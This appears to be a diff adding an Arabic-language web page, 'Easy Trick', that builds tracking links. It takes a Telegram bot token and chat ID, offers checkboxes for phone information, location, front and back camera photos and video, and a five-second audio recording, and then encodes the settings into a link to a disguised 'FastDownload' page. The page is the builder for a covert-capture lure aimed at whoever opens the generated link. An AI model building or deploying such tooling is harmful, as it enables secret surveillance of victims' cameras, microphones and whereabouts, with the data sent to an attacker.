@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Easy Trick - مولّد الروابط المتقدم</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+    :root {
+        --bg: #000000;
+        --panel-bg: rgba(5, 5, 5, 0.85);
+        --border: #1a1a1a;
+        --neon-blue: #00f3ff;
+        --neon-red: #ff003c;
+        --text-main: #e0e0e0;
+        --text-muted: #888888;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+        background-color: var(--bg);
+        background-image: 
+            radial-gradient(circle at 50% 0%, rgba(0, 243, 255, 0.1) 0%, transparent 50%),
+            radial-gradient(circle at 100% 100%, rgba(255, 0, 60, 0.05) 0%, transparent 50%),
+            linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px),
+            linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
+        background-size: 100% 100%, 100% 100%, 30px 30px, 30px 30px;
+        color: var(--text-main);
+        font-family: 'Cairo', sans-serif;
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+    }
+
+    .container {
+        background: var(--panel-bg);
+        border: 1px solid rgba(0, 243, 255, 0.3);
+        border-radius: 8px;
+        width: 100%;
+        max-width: 700px;
+        padding: 40px 30px;
+        box-shadow: 0 0 20px rgba(0, 243, 255, 0.1), inset 0 0 20px rgba(0, 243, 255, 0.05);
+        position: relative;
+        backdrop-filter: blur(10px);
+    }
+
+    /* زوايا النيون */
+    .container::before, .container::after {
+        content: '';
+        position: absolute;
+        width: 20px;
+        height: 20px;
+        pointer-events: none;
+    }
+    .container::before {
+        top: -1px; right: -1px;
+        border-top: 2px solid var(--neon-blue);
+        border-right: 2px solid var(--neon-blue);
+    }
+    .container::after {
+        bottom: -1px; left: -1px;
+        border-bottom: 2px solid var(--neon-red);
+        border-left: 2px solid var(--neon-red);
+    }
+
+    .header {
+        text-align: center;
+        margin-bottom: 35px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+    }
+
+    /* مكان الصورة */
+    .logo-placeholder {
+        width: 120px;
+        height: 120px;
+        border-radius: 50%;
+        border: 2px dashed var(--neon-blue);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin-bottom: 15px;
+        box-shadow: 0 0 15px rgba(0, 243, 255, 0.2);
+        overflow: hidden;
+        background: #000;
+    }
+
+    .logo-placeholder img {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+    }
+
+    .header h1 {
+        font-family: 'Cairo', sans-serif;
+        font-size: 32px;
+        font-weight: 900;
+        color: #fff;
+        text-shadow: 0 0 10px var(--neon-blue), 0 0 20px var(--neon-blue);
+        letter-spacing: 2px;
+        margin-bottom: 5px;
+        text-transform: uppercase;
+    }
+
+    .header p {
+        color: var(--neon-blue);
+        font-size: 14px;
+        letter-spacing: 1px;
+    }
+
+    .input-group {
+        position: relative;
+        margin-bottom: 25px;
+    }
+
+    .input-group svg {
+        position: absolute;
+        right: 16px;
+        top: 50%;
+        transform: translateY(-50%);
+        width: 20px;
+        height: 20px;
+        fill: var(--neon-blue);
+        filter: drop-shadow(0 0 5px var(--neon-blue));
+    }
+
+    .input-group input {
+        width: 100%;
+        background: rgba(0, 0, 0, 0.6);
+        border: 1px solid #333;
+        border-radius: 4px;
+        padding: 16px 50px 16px 16px;
+        color: var(--neon-blue);
+        font-family: 'Share Tech Mono', monospace;
+        font-size: 16px;
+        outline: none;
+        transition: all 0.3s;
+        direction: ltr;
+        text-align: left;
+    }
+
+    .input-group input:focus {
+        border-color: var(--neon-blue);
+        box-shadow: 0 0 15px rgba(0, 243, 255, 0.3);
+        background: rgba(0, 243, 255, 0.05);
+    }
+    
+    .input-group input::placeholder {
+        color: var(--text-muted);
+        font-family: 'Cairo', sans-serif;
+    }
+
+    .features-grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 15px;
+        margin-bottom: 30px;
+    }
+
+    .feature-card {
+        background: rgba(0, 0, 0, 0.5);
+        border: 1px solid #222;
+        border-radius: 4px;
+        padding: 15px;
+        display: flex;
+        align-items: center;
+        gap: 15px;
+        cursor: pointer;
+        transition: all 0.3s;
+        position: relative;
+        overflow: hidden;
+    }
+
+    .feature-card:hover {
+        border-color: var(--neon-blue);
+        box-shadow: 0 0 10px rgba(0, 243, 255, 0.1);
+    }
+
+    .feature-card input {
+        display: none;
+    }
+
+    .feature-card .checkbox-ui {
+        width: 20px;
+        height: 20px;
+        border: 1px solid #444;
+        border-radius: 2px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        transition: all 0.2s;
+        flex-shrink: 0;
+    }
+
+    .feature-card .checkbox-ui svg {
+        width: 14px;
+        height: 14px;
+        fill: #000;
+        opacity: 0;
+        transform: scale(0.5);
+        transition: all 0.2s;
+    }
+
+    .feature-card input:checked + .checkbox-ui {
+        background: var(--neon-blue);
+        border-color: var(--neon-blue);
+        box-shadow: 0 0 10px rgba(0, 243, 255, 0.5);
+    }
+
+    .feature-card input:checked + .checkbox-ui svg {
+        opacity: 1;
+        transform: scale(1);
+    }
+
+    .feature-card .feature-text {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-size: 15px;
+        color: var(--text-muted);
+        transition: color 0.2s;
+        white-space: nowrap;
+        font-weight: 700;
+    }
+
+    .feature-card input:checked ~ .feature-text {
+        color: #fff;
+        text-shadow: 0 0 5px rgba(255,255,255,0.5);
+    }
+
+    .feature-card .feature-text svg {
+        width: 18px;
+        height: 18px;
+        fill: currentColor;
+        flex-shrink: 0;
+    }
+
+    .feature-card.audio-card {
+        grid-column: 1 / -1;
+    }
+
+    .btn {
+        width: 100%;
+        padding: 16px;
+        border: 1px solid var(--neon-blue);
+        border-radius: 4px;
+        font-size: 18px;
+        font-family: 'Cairo', sans-serif;
+        font-weight: 700;
+        cursor: pointer;
+        transition: all 0.3s;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        gap: 10px;
+        letter-spacing: 1px;
+        background: transparent;
+        color: var(--neon-blue);
+        box-shadow: 0 0 10px rgba(0, 243, 255, 0.2), inset 0 0 10px rgba(0, 243, 255, 0.1);
+    }
+
+    .btn-primary:hover {
+        background: var(--neon-blue);
+        color: #000;
+        box-shadow: 0 0 20px rgba(0, 243, 255, 0.6), inset 0 0 10px rgba(0, 243, 255, 0.4);
+    }
+
+    .result-box {
+        margin-top: 25px;
+        display: none;
+        animation: fadeIn 0.4s ease;
+    }
+
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(10px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+
+    .result-box textarea {
+        width: 100%;
+        background: rgba(0, 0, 0, 0.8);
+        border: 1px solid var(--neon-red);
+        border-radius: 4px;
+        padding: 16px;
+        color: var(--neon-red);
+        font-family: 'Share Tech Mono', monospace;
+        font-size: 14px;
+        resize: none;
+        height: 90px;
+        outline: none;
+        margin-bottom: 15px;
+        line-height: 1.5;
+        box-shadow: inset 0 0 10px rgba(255, 0, 60, 0.1);
+        direction: ltr;
+        text-align: left;
+    }
+
+    .btn-copy {
+        border-color: var(--neon-red);
+        color: var(--neon-red);
+        box-shadow: 0 0 10px rgba(255, 0, 60, 0.2), inset 0 0 10px rgba(255, 0, 60, 0.1);
+    }
+
+    .btn-copy:hover {
+        background: var(--neon-red);
+        color: #000;
+        box-shadow: 0 0 20px rgba(255, 0, 60, 0.6), inset 0 0 10px rgba(255, 0, 60, 0.4);
+    }
+    
+    .btn-copy.copied {
+        background: var(--neon-red);
+        color: #000;
+    }
+
+    @media (max-width: 600px) {
+        .container { padding: 30px 20px; }
+        .features-grid { grid-template-columns: 1fr; }
+        .feature-card .feature-text { font-size: 14px; white-space: normal; }
+    }
+</style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <!-- مكان الصورة بتاعتك، حط الرابط بتاعها مكان YOUR_IMAGE_URL_HERE -->
+        <div class="logo-placeholder">
+            <img src="YOUR_IMAGE_URL_HERE" alt="Easy Trick Logo" onerror="this.style.display='none'; this.parentElement.innerHTML='<span style=color:#00f3ff;font-size:12px;text-align:center;>أضف<br>صورة</span>';">
+        </div>
+        <h1>Easy Trick</h1>
+        <p>مولّد الروابط المتقدم</p>
+    </div>
+
+    <!-- Chat ID Input -->
+    <div class="input-group">
+        <input type="text" id="id" placeholder="أدخل آيدي حساب التليجرام (Chat ID)">
+        <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+    </div>
+
+    <!-- Token Input -->
+    <div class="input-group">
+        <input type="text" id="token" placeholder="أدخل توكن البوت (Bot Token)">
+        <svg viewBox="0 0 24 24"><path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
+    </div>
+
+    <!-- Features Grid -->
+    <div class="features-grid">
+        <!-- Device Info -->
+        <label class="feature-card">
+            <input type="checkbox" value="inf" checked>
+            <div class="checkbox-ui"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+            <div class="feature-text">
+                <svg viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg>
+                معلومات الهاتف
+            </div>
+        </label>
+
+        <!-- Location -->
+        <label class="feature-card">
+            <input type="checkbox" value="l" checked>
+            <div class="checkbox-ui"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+            <div class="feature-text">
+                <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+                الموقع الجغرافي
+            </div>
+        </label>
+
+        <!-- Front Camera -->
+        <label class="feature-card">
+            <input type="checkbox" value="fc" checked>
+            <div class="checkbox-ui"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+            <div class="feature-text">
+                <svg viewBox="0 0 24 24"><path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
+                كاميرا أمامية
+            </div>
+        </label>
+
+        <!-- Back Camera -->
+        <label class="feature-card">
+            <input type="checkbox" value="bc" checked>
+            <div class="checkbox-ui"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+            <div class="feature-text">
+                <svg viewBox="0 0 24 24"><path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
+                كاميرا خلفية
+            </div>
+        </label>
+
+        <!-- Front Video -->
+        <label class="feature-card">
+            <input type="checkbox" value="fcv" checked>
+            <div class="checkbox-ui"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+            <div class="feature-text">
+                <svg viewBox="0 0 24 24"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>
+                فيديو أمامي
+            </div>
+        </label>
+
+        <!-- Back Video -->
+        <label class="feature-card">
+            <input type="checkbox" value="bcv" checked>
+            <div class="checkbox-ui"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+            <div class="feature-text">
+                <svg viewBox="0 0 24 24"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>
+                فيديو خلفي
+            </div>
+        </label>
+
+        <!-- Audio -->
+        <label class="feature-card audio-card">
+            <input type="checkbox" value="r" checked>
+            <div class="checkbox-ui"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+            <div class="feature-text">
+                <svg viewBox="0 0 24 24"><path d="M12 14c1.66 0 2.99-1.34 2.99-3L15 5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"/></svg>
+                تسجيل صوتي (5 ثواني)
+            </div>
+        </label>
+    </div>
+
+    <button class="btn btn-primary" onclick="generate()">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 11h-4v4h-2v-4H7v-2h4V7h2v4h4v2z"/></svg>
+        توليد الرابط
+    </button>
+
+    <div class="result-box" id="resultBox">
+        <textarea id="result" readonly placeholder="سيظهر الرابط هنا..."></textarea>
+        <button class="btn btn-copy" id="copyBtn" onclick="copyLink()">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+            نسخ الرابط
+        </button>
+    </div>
+</div>
+
+<script>
+function generate() {
+    const id = document.getElementById("id").value.trim();
+    const token = document.getElementById("token").value.trim();
+
+    if (!id || !token) {
+        alert("يرجى إدخال الآيدي والتوكن أولاً!");
+        return;
+    }
+
+    const params = new URLSearchParams();
+    params.set("id", id);
+    params.set("token", token);
+
+    document.querySelectorAll('input[type="checkbox"]:checked')
+    .forEach(item => params.append(item.value, ""));
+
+    const encoded = btoa(unescape(encodeURIComponent(params.toString())));
+
+    const resultBox = document.getElementById("resultBox");
+    const resultInput = document.getElementById("result");
+    
+    resultInput.value = "https://host895.github.io/FastDownload/dl.html?u=" + encoded;
+    resultBox.style.display = "block";
+    
+    const copyBtn = document.getElementById("copyBtn");
+    copyBtn.classList.remove("copied");
+    copyBtn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg> نسخ الرابط';
+}
+
+function copyLink() {
+    const result = document.getElementById("result");
+    if (!result.value) return;
+
+    navigator.clipboard.writeText(result.value).then(() => {
+        const copyBtn = document.getElementById("copyBtn");
+        copyBtn.classList.add("copied");
+        copyBtn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> تم النسخ!';
+        
+        setTimeout(() => {
+            copyBtn.classList.remove("copied");
+            copyBtn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg> نسخ الرابط';
+        }, 2000);
+    });
+}
+</script>
+
+</body>
+  </html>
